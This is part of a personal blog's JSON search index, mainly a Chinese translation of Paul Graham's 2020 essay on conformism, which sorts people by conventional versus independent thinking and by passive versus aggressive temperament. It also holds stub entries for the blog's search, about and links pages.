Conformism\nAuthor : Paul Gramham\nJuly 2020\n给人分类最好的标准之一便是其因循程度和积极性。想象一个平面坐标系，横轴从左到右分别是循规蹈矩的人和独立思考的人，竖轴自底向上是消极温顺的人和积极好斗的人。结果分成四个象限各代表四种人。从左上方开始逆时针旋转，依次是积极守旧型、消极守旧型、消极独立型、积极独立型。\n我认为这四种类型的人在大多数社会都能找到，而一个人被归类入那种象限更多取决于自身的个性而不是社会的流行价值观。[1]\n从儿童中能够找到支持以上两点的绝佳证据。在小学里这四种类型的人都很常见，而学校的规章制度却千篇一律地专制，这无疑表明人能成为何种类型取决于他们自己，而不是由规矩所决定。\n左上方(第二象限)的孩子是积极守旧型，那些向老师告密的红卫兵。他们相信规矩必须被严格遵守，不守规矩的人必须受到惩罚。\n左下方(第三象限)的孩子是消极守旧型，那些温顺如绵羊的老好人。他们小心谨慎、循规蹈矩，但当其他孩子破坏规矩的时候,他们的第一反应是为其可能被罚而担忧，而不是想方设法让他们受罚。\n右上方(第一象限)的孩子是消极独立型，那些心不在焉的游离派。他们对规矩不甚关心，可能连规矩的内容都不太清楚。\n右下方(第四象限)的孩子是积极独立型，那些最淘气的刺头儿。他们看到规矩的第一反应就是质疑之，被吩咐去做某事时，他们往往会和要求对着干。\n当然，在衡量因循程度时，你必须谈及规矩所关系到的对象，而这随着孩子的成长而变化。对于十分幼小的孩子来说，规矩由成人制定。但当孩子长大些，他们的同龄人则成为了规矩的来源。所以一帮少年对学校规则尽可以表示轻蔑，却同样不是独立思考的结果，反而是从众的表现。\n正如我们可以通过叫声分辨鸟的种类，成年人也可以通过言语辨认四种类型的儿童。红卫兵喊叫着“打倒反对派！”，老好人说“邻居们会怎么想？”，游离派声称“各有所好”，刺头儿高呼“但是它的确在动”(原文:Eppur si muove)。\n这四种类型的人并不同样多。消极型的人比积极型的人更多，循规蹈矩者更是远多于独立思考者。所以老好人是最大的一类群体，而刺头儿则最少。\n一个人属于哪种象限更多取决于自身的个性而不是被规矩的类型所限，大多数人就算在完全不同的社会成长仍然会成为和原来属于相同象限的人。\n普利斯顿大学的教授罗伯特·乔治最近写道：\n 我有时侯会问学生：如果他们是生活在废奴前的南方白人，他们在奴隶制上的的立场会是如何？你猜他们怎么说？他们依然会成为废奴主义者！他们依然会勇敢地声讨奴隶制并不遗余力地与之作斗争。\n 教授该是出于礼貌而言止于此，但是学生们在那样的情况下肯定不会坚持成为废奴主义者。实际上，我不惮以最坏的恶意揣测这些学生，他们不仅总体上会表现得和当时的人一样，现在他们之中规矩的积极捍卫者在当时也会是红卫兵式的人物。换句话说，他们不仅不会去反对奴隶制，还会成为奴隶制最坚定的维护者。\n我承认自己怀有偏见，但在我看来那一撮积极守旧型的人对世界上的混乱负有极大的责任，自启蒙运动以来我们演化出的很多措施就是用来保护剩下的人免受侵犯。其中尤为重要的是，“异端”这一概念逐渐淡化，取而代之的是各种不同观点自由辩论的原则，就算有些观点目前还不被认可，尝试践行者也不会受到任何惩罚。[2]\n不过，为什么独立思想者需要被保护呢？因为他们拥有所有的新想法。比如，想当一个成功的科学家，仅仅做到正确是不够的。你必须在其他人都错误的时候保持正确，而循规蹈矩的人是做不到的。类似地，所有成功的创业CEO都不仅拥有主见，还积极伸张。所以社会的繁荣和其拥有限制积极守旧型的措施密切相关，这并非偶然。[3]\n近几年来，我们很多人都注意到那些保护自由探索的措施正在被动摇。有些人说我们是过度反应———因为那些措施并没有被削弱很多，或者是为了更重大的利益让步。我们现在就来处理第二种看法。每当守旧派占上风，他们总是宣称为了更大的利益，只是碰巧每次都是出于一种不同的、不可相容的重大利益。\n至于前一种观点，也就是认为独立思想者敏感过度，自由探索的大门并没有被关得那么严，我想说的是，除非你自己是个有主见的人，否则你无法对此做出判断。除非你自己拥有观念的水位，否则你无法知道它是否正在干涸。而只有独立思想者拥有最先锋的看法，也正因此，他们思想领域探索自由度的变化非常敏感，他们就是煤矿中的金丝雀(译者注:the canaries in this coalmine)。\n守旧者总是宣称他们不想阻塞所有言路，而只是针对坏主意。\n你可能会觉得字里行间其排除异己之心昭然若揭。但我还是要讲清楚为什么我们需要讨论那些“坏主意”，这有两条原因。\n其一，任何决定哪种意见会被禁止的过程都一定会出错。因为没有聪明人想承担这种任务，所以最终这种决定都会由蠢人做出。而当一个过程导致了很多错误，就需要留出误差幅度，也就是减少所禁止的意见数。但积极守旧者很难做到这点，因为他们从小就乐于看到别人受罚，又喜欢互相竞争。正统派的执行者不能容许中间意见的存在，这会给其他执行者以机会在道德纯洁度上占上风，甚至可能会让他们掉转头来攻击自己。所以我们不但不会留出原本所需的误差幅度，反而会出现竞次，最终让所有貌似异端的观点都被禁止。[4]\n其二，观点之间的联系要比看上去紧密得多。如果你限制某些话题的讨论，受到影响的不止是那些话题，限制会传播至任何牵涉到被禁内容的话题，而这并非极端案例。最好的观点往往会在远离起源的领域产生后果。在一个意见会被部分地禁止的世界中拥有想法就像在角落里有雷区的球场上踢足球一样，你会感到球场变了样，不再能踢球如常，就算在安全的地面上也踢得极为压抑。\n过去，独立思想者保护自己的方式是在少数几个地方聚集——最初是在法庭,后来是在大学——在这里他们一定程度上能制定自己的规则。这些可以让人带着想法工作的场所往往拥有保护自由探索的措施，正如晶圆厂拥有强力的空气过滤器，录音棚具有良好的隔音效果。至少在过去几个世纪里，当积极守旧者由于各种原因得以横行霸道的时候，大学是最安全的地方。\n然而不凑巧的是，这一回躲进大学可能不再管用，因为最新一波不宽容的浪潮开始在大学兴起，这股浪潮始于20世纪80年代中期，到2000年似乎已经退去，但就在最近，随着社交媒体的到来，它又死灰复燃了。不幸的是，这似乎是硅谷在自摆乌龙。尽管硅谷的管理者几乎都是独立思想者，但他们给了积极守旧者一个他们做梦都想不到的工具。\n另一方面，也许大学内部自由探究精神的衰退，既是独立思想离开的征兆，也是其原因。50年前本可成为教授的人现在有了其他选择。现在，他们可以成为定量分析师或开创公司。你必须有独立的思想才能在这两方面取得成功。如果这些人成为教授，他们会为了学术自由而进行更严厉的抵抗。因此，也许现在想象独立思想者逃离日渐衰败的大学这一景象会显得过于悲观。大学的衰退，也许正因为很多独立思想者已经离开。\n虽然我花了很多时间思考这种情况，但我无法预测结果如何。会有大学成功扭转当前的趋势，继续保持自己作为独立思想者想要聚集的地方吗？亦或独立思想者会逐渐抛弃大学？我很担心，如果真的走到那一步我们会失去什么。\n但是我对长远的未来抱有希望。独立思考者善于保护自己。如果现存的制度陷入危险，他们会创造新的制度。这需要一定的想象力，但毕竟想象力正是他们的专长。\n作者注：\n[1] 我当然意识到，如果人们的性格在任意两个方面有所不同，你就能以之为坐标轴，把划分出的四个象限称为人格类型。所以我真正要说的是此处这两条轴是正交的，两者有很大的差异\n[2] 积极保守者并不为世界上所有的麻烦负责。麻烦的另一大来源是那种魅力超凡的领导人，他们通过吸引积极保守者而获得权力。当这样的领导人出现时，积极保守型变得更加危险。\n[3] 当我运营Y Combinator时，我从不担心写一些冒犯积极守旧者的东西。如果YC是一家饼干公司，我会面临一个艰难的道德选择。积极守旧者也吃饼干。但他们并没有成功创业。所以，如果我阻止他们申请YC，唯一的影响就是节省我们阅读申请表的工作量。\n[4] 在一个领域已经取得了进步：对谈论被禁思想的惩罚不如过去严厉。被杀的危险很小，至少在较富裕的国家是如此。积极守旧者大多满足于让人被炒鱿鱼。\n[5] 许多教授都有独立的思想，尤其是在数学、硬科学和工程学方面，在这些领域必须靠独立思想取得成功。但学生更能代表普通民众，因此大多是传统思维。所以，当教授和学生之间发生冲突时，这不仅是代际之间的冲突，还是不同类型的人之间的冲突。\n","date":"2020-10-28T00:29:00Z","permalink":"https://chinggg.github.io/post/the-four-quadrants-of-conformism/","tags":["翻译","随笔"],"title":"(译)因循的四象限"},{"categories":null,"contents":"","date":"2020-02-07T17:43:21+08:00","permalink":"https://chinggg.github.io/search/","tags":null,"title":"搜索"},{"categories":null,"contents":"curious but honest, naive but patient.\n ","date":"2018-12-05T13:40:21+08:00","permalink":"https://chinggg.github.io/about/","tags":null,"title":"关于"},{"categories":null,"contents":"友情链接 Canary Pwn\n","date":null,"permalink":"https://chinggg.github.io/links/","tags":null,"title":"链接"}]